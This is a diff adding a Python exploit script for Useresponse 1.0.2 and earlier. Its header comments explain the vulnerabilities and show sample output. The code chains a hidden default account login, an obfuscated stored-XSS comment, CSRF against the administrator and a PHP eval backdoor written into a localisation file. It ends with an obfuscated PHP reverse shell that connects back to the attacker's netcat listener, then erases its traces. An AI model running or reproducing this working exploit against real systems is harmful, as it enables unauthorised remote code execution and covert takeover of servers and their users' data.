@@ -1,0 +1,487 @@
+#!/usr/bin/python
+# --------------------
+# | abuseresponse.py |
+# --------------------
+# Useresponse <= 1.0.2 privilege escalation & remote code execution exploit
+# vendor: USWebStyle (http://www.uswebstyle.com/)
+# software: http://www.useresponse.com/
+# vulns found by bcoles (@_bclose) and mr_me (@net__ninja)
+# exploit by mr_me
+# tested environments: 
+# 	- Ubuntu 10.10 Lamp stack (MySQL v5.1.61-0/PHP v5.3.3-1)
+#	- Fedora 12 LAMP stack
+#
+# Vendor description:
+# -------------------
+# Our solution focuses on the task to improve company's communication with their customers. We make it easier 
+# for customers to find answers to their questions, get fast feedback, and have real ability to influence the 
+# future of the products and services they use.
+#
+# Explanation:
+# ------------
+# After pwning the ActiveCollab 'chat module' Stas Kuzma from USWebStyle thought it would be his and his teams best interest
+# to have the 'Useresponse' application security 'tested'.
+# 
+# I explained that there is no way I can afford the corporate edition and that I would still be glad to test it if I can recieve a copy
+# (for non commerial use dah). A kind email back from Stas and I had full access to the corporate edition of the software package
+# 
+# ... think a bit ... test a bit ... think a bit ... test a bit ... etc
+# 
+# We had a really hard time finding proper exploitable vulnerabilities as halfway through our testing they decided to remove our license :/
+# We notified the vendor a few weeks back regarding these bugs so I'm sure they will release a fix soon.
+# 
+# Nonetheless, the path to unauth'ed remote code execution is as follows:
+#
+# 1. backdoor account that is unable to be deleted by the administrators frontend. Alternatively, 
+#    you can just register an account without admin verification ;)
+# 2. privilege escalation via a stored XSS when abusing bbcode parsing
+# 3. CSRF against all administrator functionality 
+# 4. remote code execution by circumventing escape characters and abusing an fwrite()
+#
+# Somewhat detailed analysis:
+# ---------------------------
+# Vulnerability 1 - Default backdoor account:
+# ```````````````````````````````````````````
+# Upon installation we can see that this application installs a default **hidden** user account called 'anonymous'.
+# At first I thought this was a practical joke. When I say hidden, I mean there is a boolean flag used in the 
+# database to mark the account is actually hidden so that you cannot see the account from the administration frontend.
+# Additionally, the frontend does not allow an administrator to delete other accounts anyway (wtf!?). o_O
+#
+# Vulnerability 2 - Privilege escalation via persistant cross site scripting in bbcode:
+# `````````````````````````````````````````````````````````````````````````````````````
+# The application allows for a low privlidged attacker to embed a malcious JavaScript payload. An adminsitrator viewing
+# the page with a standard browser will trigger the embeded JavaScript payload and allow for an attacker to leverage 
+# the vulnerability to gain administrative access to the application or leverage the vulnerability to target the client
+# directly and attack the browser.
+#
+# The vulnerable code can be found in application/modules/system/templates/system_response_show.phtml on lines 16 & 40:
+#       
+# 13.         <h1><?php echo $this->escape($this->activeResponse->title); ?></h1>
+# 14.   </div>
+# 15.   <div class="content-object-full">
+# 16.       <?php echo $this->bbcode($this->activeResponse->content); ?>
+# 17.   </div>
+#
+# 39.                   </div>
+# 40.                   <?php echo $this->bbcode($this->activeResponse->getAnswer()->answer) ?>
+# 41.               </div>
+# 42           </div>
+#
+# of course, the clientside JavaScript doesnt help at all..
+#
+# function bbcodeToHtml(text) {
+# 
+#     ....
+#	
+#     text = text.replace(/\[img\](.*?)\[\/img\]/g, '<img src="$1" />');
+#     text = text.replace(/\[url=(.*?)](.*?)\[\/url\]/ig, '<a href="$1">$2</a>');
+#     return text;
+# }
+#
+# function copyTo(body, textArea, n) {
+#
+#    if (n == 1) {
+#        text = htmlToBbcode(body)
+#        textArea.val(text);
+#    } else if (n == 0) {
+#        text = textArea.val();
+#        html = bbcodeToHtml(text);           
+#        body.html(html);
+#    }
+# }
+#
+# Vulnerability 3 - CSRF against all administrator functionality:
+# ```````````````````````````````````````````````````````````````
+# Well this is straight forward, any of the functionaility an administrator can do can be embeded into a HTML page
+# and a link given to a logged in admin. However, for exploitation, it is obviously very convenient to combine this
+# issue with the persistant cross site scripting.
+# 
+# Vulnerability 3 - remote code execution by writing php into a file:
+# ```````````````````````````````````````````````````````````````````
+# This vulnerability exists when attempting to update a module's dictionary. The below PoC request updates the dictionary
+# in application/localization/en/thanks.php.
+#
+# A few things to note:
+# - There is a .htaccess file under /application by default that prevents the direct access of any php files
+#   but this doesnt prevent the code from being executed as the code is included and executed when viewing the edit page.
+# - Zend Guard attempts to escape a single quote ' however if you escape the escape (\\'), then you can break out
+#   of the injected array.
+#
+# POST /webapps/ur/admin/languages/en/dictionary/thanks/add HTTP/1.1
+# Host: localhost
+# Cookie: PHPSESSID=d63ib6ec5gakoplbf6tkjlb4s7;
+# Content-Type: application/x-www-form-urlencoded
+# Content-Length: 553
+#
+# translation%5BUsers+can+give+praise+to+you%2C+so+all+know+how+customers+are+satisifed+with+provided+quality%5D=
+# Users+can+give+praise+to+you%2C+so+all+know+how+customers+are+satisifed+with+provided+quality&translation%5BAll
+# +Thanks%5D=All+Thanks&translation%5BSay+thanks%5D=Say+thanks&translation%5BThanks%5D=Thanks&translation%5Bthanks%5D=thanks
+# &translation%5BTell+us+kind+words+or+what%27s+on+your+mind%5D=Tell+us+kind+words+or+what%27s+on+your+mind&translation%5B%
+# 3Acount+more+thanks%5D=%3Acount+more+thanks&translation%5BThank+you+too%5D=Thank+you+too
+# 
+# lines 221-245 in application/modules/system/controllers/AdminLanguagesController.php show the function that calls addTranslation()
+#
+# 221.    public function editDictionaryAction()
+# 222.   {
+# 223.       $this->view->layout()->setLayout('translation');
+# 224.       $langCode = $this->_getParam('code');
+# 225.       $moduleName = $this->_getParam('module-name');
+# 226.       $module = $this->modules->findByName($moduleName);
+# 227.       
+# 228.       if (!$module->canEditTranslation($langCode)) {
+# 229.           $this->view->notify()->error("Dictionary can't be updated!");
+# 230.           $this->_redirect();
+# 231.       }
+# 232.       if ($this->getRequest()->isPost()) {						; must be a post request
+# 233.           $translation = $this->getRequest()->getParam('translation');			; get the translation array parameters
+# 234.           $module->addTranslation($translation, $langCode);				; add the translation
+# 235.           Singular_Translate::clearCache();
+# 236.           Singular_Runtime::extract('cachemanager')
+# 237.                   ->getCache('default')
+# 238.                   ->clean(Zend_Cache::CLEANING_MODE_ALL);
+# 239.           $this->view->notify()->success("Dictionary is updated");
+# 240.           $this->_redirect();
+# 241.       }
+# 242.
+# 243.       $this->view->langKey = $module->getLangKey();
+# 244.       $this->view->translation = $module->getTranslation($langCode);
+# 245.   }
+# 
+# Unfortunately this is as far as I can go as Zend Guard obfuscates the php when this function resides 
+# and I dont have unlimited hours.
+#
+# About this exploit:
+# -------------------
+# This exploit targets the russian language for less chance of detection as it is enabled by default.
+# Other functionality included are:
+#
+# 	- HTTP Proxy support for all requests
+# 	- Simple JavaScript obfuscation 
+# 	- Simple PHP reverse shell obfuscation (thanks msf)
+# 	- Simple PHP patch to remove the backdoor from the /application/localization/ru/thanks.php file
+# 	- Backdoor injection & execution is triggered by the admin
+# 	- The malicious comment is patched after the exploit is complete
+#
+# Images for exploitation can be found at http://pastebin.com/MH55NS07 (MD5(urpwned.tar.gz)= b4226779bf4f2bb3c720fe94fd4afb4e).
+# 
+# mr_me@gliese:~$ wget http://pastebin.com/raw.php?i=MH55NS07 -O urpwned.txt
+# mr_me@gliese:~$ dos2unix -ascii urpwned.txt 
+# mr_me@gliese:~$ cat urpwn.txt | base64 -d > urpwned.tar.gz
+# mr_me@gliese:~$ openssl md5 urpwned.tar.gz
+# MD5(urpwn.tar.gz)= b4226779bf4f2bb3c720fe94fd4afb4e
+# mr_me@gliese:~$ tar -zxvf urpwned.tar.gz 
+# urpwned/
+# urpwned/1.png
+# urpwned/2.png
+#
+# Example usage:
+# --------------
+# mr_me@vuln-web-server:~$ ./abuseresponse.py -p localhost:8080 -r localhost -d /webapps/ur/ -c 127.0.0.1:5555
+#
+#	| -------------------------------------------------------------------------- |
+#	| Useresponse  <= 1.0.2 privilege escalation & remote code execution explo!t |
+#	| found & exploited by: bcoles & mr_me --------------------------------------|
+#
+# (+) Testing proxy @ localhost:8080.. proxy is found to be working!
+# (+) Logging into the target application...
+# (+) Login successful!
+# (+) Installing backdoor JavaScript...
+# (+) Backdoor JavaScript installed!
+# (+) Listening on port 5555 for the victim admin...
+# Connection from 127.0.0.1 port 5555 [tcp/*] accepted
+# id;uname -a
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+# Linux vuln-web-server 2.6.35-32-generic #67-Ubuntu SMP Mon Mar 5 19:35:26 UTC 2012 i686 GNU/Linux
+# pwd                                       
+# /var/www/webapps/ur
+# cat application/localization/ru/thanks.php
+# <?php 
+#  return array('Thank you too' => '\\')."{${eval(base64_decode($_REQUEST[lulz]))}}".("rce"//', 
+# );
+# exit
+# (+) Cleaned backdoor php code!
+# (+) Cleaning up JavaScript...
+# (+) JavaScript cleanup complete!
+# mr_me@vuln-web-server:~$ cat /var/www/webapps/ur/application/localization/ru/thanks.php
+# <?php 
+# return array('Thank you too' => 'thanks',
+# );
+# ############################################################################################################
+
+import sys
+import urllib
+import urllib2
+import socket
+import re
+from optparse import OptionParser
+from base64 import b64encode
+from cookielib import CookieJar
+from os import system
+
+usage = "./%prog [<options>] -r [target] -d [directory]"
+usage += "\nExample: ./%prog -p 127.0.0.1:8080 -r target.com -d /webapps/ur/ -c 127.0.0.1:1337"
+  
+parser = OptionParser(usage=usage)
+parser.add_option("-p", type="string",action="store", dest="proxy",
+                  help="HTTP proxy <server:port>")
+parser.add_option("-r", type="string", action="store", dest="target",
+                  help="The remote server <server:port>")
+parser.add_option("-d", type="string", action="store", dest="target_path",
+                  help="Directory path to userresponse")
+parser.add_option("-c", type="string", action="store", dest="cb_server",
+                  help="The connectback server <ip:port>")
+  
+(options, args) = parser.parse_args()
+
+def banner():
+	print("\n\t| -------------------------------------------------------------------------- |")
+	print("\t| Useresponse  <= 1.0.2 privilege escalation & remote code execution explo!t |")
+	print("\t| found & exploited by: bcoles & mr_me --------------------------------------|\n")
+
+# validate that the poxy works
+def test_proxy():
+    check = 1
+    sys.stdout.write("(+) Testing proxy @ %s.. " % (options.proxy))
+    sys.stdout.flush()
+    try:
+        req = urllib2.Request("http://www.google.com/")
+        req.set_proxy(options.proxy,"http")
+        check = urllib2.urlopen(req)
+    except:
+        check = 0
+        pass
+    if check != 0:
+        sys.stdout.write("proxy is found to be working!\n")
+        sys.stdout.flush()
+    else:
+        sys.stdout.write("proxy failed, exiting..\n")
+        sys.exit(0)
+
+# build the reverse php shell
+# msf code + some more stealth modifications
+def build_php_code(cb_server,cb_port):
+	phpkode  = ("""
+	@set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);""")
+	phpkode += ("""$dis=@ini_get('disable_functions');""")
+	phpkode += ("""if(!empty($dis)){$dis=preg_replace('/[, ]+/', ',', $dis);$dis=explode(',', $dis);""")
+	phpkode += ("""$dis=array_map('trim', $dis);}else{$dis=array();} """)
+	phpkode += ("""if(!function_exists('LcNIcoB')){function LcNIcoB($c){ """)
+	phpkode += ("""global $dis;if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {$c=$c." 2>&1\\n";} """)
+	phpkode += ("""$imARhD='is_callable';$kqqI='in_array';""")
+	phpkode += ("""if($imARhD('popen')and!$kqqI('popen',$dis)){$fp=popen($c,'r');""")
+	phpkode += ("""$o=NULL;if(is_resource($fp)){while(!feof($fp)){ """)
+	phpkode += ("""$o.=fread($fp,1024);}}@pclose($fp);}else""")
+	phpkode += ("""if($imARhD('proc_open')and!$kqqI('proc_open',$dis)){ """)
+	phpkode += ("""$handle=proc_open($c,array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),$pipes); """)
+	phpkode += ("""$o=NULL;while(!feof($pipes[1])){$o.=fread($pipes[1],1024);} """)
+	phpkode += ("""@proc_close($handle);}else if($imARhD('system')and!$kqqI('system',$dis)){ """)
+	phpkode += ("""ob_start();system($c);$o=ob_get_contents();ob_end_clean(); """)
+	phpkode += ("""}else if($imARhD('passthru')and!$kqqI('passthru',$dis)){ob_start();passthru($c); """)
+	phpkode += ("""$o=ob_get_contents();ob_end_clean(); """)
+	phpkode += ("""}else if($imARhD('shell_exec')and!$kqqI('shell_exec',$dis)){ """)
+	phpkode += ("""$o=shell_exec($c);}else if($imARhD('exec')and!$kqqI('exec',$dis)){ """)
+	phpkode += ("""$o=array();exec($c,$o);$o=join(chr(10),$o).chr(10);}else{$o=0;}return $o;}} """)
+	phpkode += ("""$nofuncs='no exec functions'; """)
+	phpkode += ("""if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){ """)
+	phpkode += ("""$s=@fsockopen('tcp://%s','%s');while($c=fread($s,2048)){$out = ''; """ % (cb_server, cb_port))
+	phpkode += ("""if(substr($c,0,3) == 'cd '){chdir(substr($c,3,-1)); """)
+	phpkode += ("""}elseif (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit'){break;}else{ """)
+	phpkode += ("""$out=LcNIcoB(substr($c,0,-1));if($out===false){fwrite($s,$nofuncs); """)
+	phpkode += ("""break;}}fwrite($s,$out);}fclose($s);}else{ """)
+	phpkode += ("""$s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);@socket_connect($s,'%s','%s'); """ % (cb_server, cb_port))
+	phpkode += ("""@socket_write($s,"socket_create");while($c=@socket_read($s,2048)){ """)
+	phpkode += ("""$out = '';if(substr($c,0,3) == 'cd '){chdir(substr($c,3,-1)); """)
+	phpkode += ("""} else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') { """)
+	phpkode += ("""break;}else{$out=LcNIcoB(substr($c,0,-1));if($out===false){ """)
+	phpkode += ("""@socket_write($s,$nofuncs);break;}}@socket_write($s,$out,strlen($out)); """)
+	phpkode += ("""}@socket_close($s);} """)
+	phpkode += ("""$pfile = getcwd()."/application/localization/ru/thanks.php"; """)
+	phpkode += ("""$patchdata = "<?php \\nreturn array('Thank you too' => 'thanks',\\n);\\n"; """)
+	phpkode += ("""$fh = fopen($pfile, 'w');fwrite($fh, $patchdata);fclose($fh);""")
+	return phpkode
+
+# build malcious JavaScript string
+def build_js(phpkode):	
+	attackstring 	= ('\\\\\').\"{${eval(base64_decode($_REQUEST[lulz]))}}".("rce"//')
+	maliciousjs 	= ""
+	for char in attackstring:
+		maliciousjs += "%s," % str(ord(char))
+	bdjs  = ("""var j = String.fromCharCode(%s); """ % (maliciousjs[:-1]))
+	bdjs += ("""document.write('<iframe name=\\\'f\\\' style=\\\'display:none;height:1px;width:1px\\\'></iframe>""")
+	bdjs += ("""<form name=\\\'l\\\' action=\\\'http://%s%sadmin/languages/ru/dictionary/thanks/edit\\\' method=\\\'post\\\' """ 
+	% (options.target, options.target_path))
+	bdjs += ("""target=\\\'f\\\'><input type=\\\'hidden\\\' name=\\\'translation[Thank you too]\\\' value='+j+' /></form>""")
+	bdjs += ("""<iframe name=\\\'rce\\\' src=\\\'http://%s%sadmin/languages/ru/dictionary/thanks/edit?lulz=%s\\\' """ 
+	% (options.target, options.target_path, b64encode(phpkode).rstrip()))
+	bdjs += ("""style=\\\'display:none;height:1px;width:1px\\\'></iframe>'); document.l.submit()""")
+	maliciousjs 	= ""
+	for char in bdjs:
+		maliciousjs += "%s," % str(ord(char))
+	maliciousxss = "[img]a\" onerror=\"eval(String.fromCharCode(%s))[/img]" % (maliciousjs[:-1])
+	return maliciousxss
+
+# get the list of local system IP addresses
+def get_ip_addresses(): 
+	addrList = socket.getaddrinfo(socket.gethostname(), None) 
+	ipList=[] 
+	for item in addrList:
+		ipList.append(item[4][0])
+	ipList.append('127.0.0.1')
+	return ipList 
+
+# the initial login request, set the proxy and cookie jar
+def login_request(req, values):
+	data = urllib.urlencode(values)
+	user_agent = 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:11.0) Gecko/20100101 Firefox/11.0'
+	headers = { "X-Requested-With" : "XMLHttpRequest", "User-Agent" : user_agent  }
+	cj = CookieJar()
+	if options.proxy:
+		proxy = urllib2.ProxyHandler({'http': options.proxy})	
+		opener = urllib2.build_opener(proxy, urllib2.HTTPCookieProcessor(cj))
+	elif not options.proxy:
+		opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
+	# install the opener for future requests
+	urllib2.install_opener(opener)
+	req = urllib2.Request(req, data, headers)
+	try:
+		result = urllib2.urlopen(req)
+	except urllib2.HTTPError, e:
+		print("(-) Error: the target server returned an invalid status code: %s" % e.code)
+		sys.exit(0)
+	except urllib2.URLError, e:
+		print("(-) Error: login failed against the target server and returned: %s" % e.reason)
+		sys.exit(0)
+	return result
+
+# post requests
+def do_post(req, values):
+	user_agent = 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:11.0) Gecko/20100101 Firefox/11.0'
+	headers = { "X-Requested-With" : "XMLHttpRequest", "User-Agent" : user_agent  }
+	data = urllib.urlencode(values)
+	req = urllib2.Request(req, data, headers)
+	try:
+		result = urllib2.urlopen(req)
+	except urllib2.HTTPError, e:
+		print("(-) Error: the target server returned an invalid status code: %s" % e.code)
+		sys.exit(0)
+	except urllib2.URLError, e:
+		print("(-) Error: post request failed against the target server and returned: %s" % e.reason)
+		sys.exit(0)
+	return result
+
+def main():
+
+	# check to ensure we have the target set and the local listener ready
+	if len(sys.argv) <= 6 or not options.cb_server or not options.target:
+        	banner()
+        	parser.print_help()
+        	sys.exit(0)
+
+	# for the anonymous email address
+	try:
+		target = socket.gethostbyaddr(options.target)[1][0]
+	except:
+		print("(-) Cannot resolve the target server")
+		sys.exit(0)
+
+	# the backdoor account, change if needed
+	username = "anonymous@%s" % (target)
+	password = "password"
+
+	# error handling
+	try:
+		cb_server = options.cb_server.split(":")[0]
+		cb_port	  = options.cb_server.split(":")[1]
+		socket.inet_aton(cb_server)
+	except socket.error:
+		print("(-) The connectback server is either not in format <ip:port> or not a valid ip address")
+		sys.exit(0)
+
+	# tidy up the targets URI path if it isnt set correct
+	if options.target_path != "/":
+		if options.target_path[:1] != "/":
+			options.target_path = "/%s" % (options.target_path)
+
+		if options.target_path.rstrip()[-1] != "/":
+			options.target_path = "%s/" % (options.target_path)
+
+	# go get the reverse php shell
+	phpkode = build_php_code(cb_server,cb_port)
+
+	# build comment and the js based on the php code
+	m_comment  = ("Interesting idea! but I think you should review you code better and ensure")
+	m_comment += (" that is in fact, secure.%s" % (build_js(phpkode)))
+
+	# login
+	url = ("http://%s%slogin" % (options.target, options.target_path))
+	values = {"email":username, "password":password, "is_remember":"0", "submit":"Login", "redirect":"reset"}
+
+	banner()
+	if options.proxy:
+        	test_proxy()
+
+	print("(+) Logging into the target application...")
+	loginbody = login_request(url, values).read()
+
+	if re.search("response_type\":\"success", loginbody):
+		print("(+) Login successful!")
+		print("(+) Installing backdoor JavaScript...")
+
+		# adding the malcious JavaScript comment
+		values 	    = {"response_id":"1", "content":m_comment, "is_private":"0", "file[0]":"", "filename[1]":"", "vote":"0"}
+		commentbody = do_post("http://%s%scomments/add" % (options.target, options.target_path), values)
+		commentre   = re.compile(r'input type=\\"hidden\\" name=\\"comment_id\\" value=\\"(.*)\\" id=\\"comment_id')
+		commentid   = commentre.search(commentbody.read())
+
+		if commentid:
+			print("(+) Backdoor JavaScript installed!")
+			print("(+) Listening on port %s for the victim admin..." % cb_port)
+
+			# we wait for the admin, upon JS execution, shell
+			if cb_server in get_ip_addresses():
+				try:
+					system("nc -lv %s" % cb_port)
+				except:
+					print("(!) You do not have privileges to execute a bind shell on port %s" % cb_port)
+					print("(!) Choose a different port or run the exploit with higher privileges")
+					sys.exit(0)
+				
+			elif cb_server not in get_ip_addresses():
+				print("(!) This host is not the connect back server")
+				print("(!) You will need to execute 'nc -lv[p] %s' on %s" % (cb_port, cb_server))
+				sys.exit(0)
+
+			print("(+) Cleaned backdoor php code!")
+			print("(+) Cleaning up JavaScript...")
+
+			# no timeout on the session and we edit the comment to cleanup because we dont have delete privileges
+			cleanupurl = ("http://%s%scomments/edit" % (options.target, options.target_path))
+			values = {"response_id":"1", "content":"interesting idea!", "file[0]":"0", 
+			"filename[1]":"", "comment_id":commentid.group(1)}
+			cleanupres = do_post(cleanupurl, values).read()
+
+			if re.search("response_type\":\"success", cleanupres):
+				print("(+) JavaScript cleanup complete!")
+
+			elif not re.search("response_type\":\"success", cleanupres):
+				print("(-) Failed to cleanup JavaScript.. login manually to repair the application.")
+				sys.exit(0)
+
+		elif not commentid:
+			print("(-) Failed to install the backdoor JavaScript...")
+			print("(!) Looks like you have to pwn your target manually!")
+			sys.exit(0)
+
+	elif not re.search("response_type\":\"success", loginbody):
+		print("(-) Login unsuccessful, check your credentials...")
+		print("(-) Maybe the anonymous account is disabled?")
+		sys.exit(0)
+
+if __name__ == "__main__":
+    main()
+
+# 00101110 00101110 00101110 01111001 
+# 01101111 01110101 00100000 01100011
+# 01100001 01101110 01110100 00100000
+# 01110011 01110100 01101111 01110000 
+# 00100000 01110101 01110011 00101110
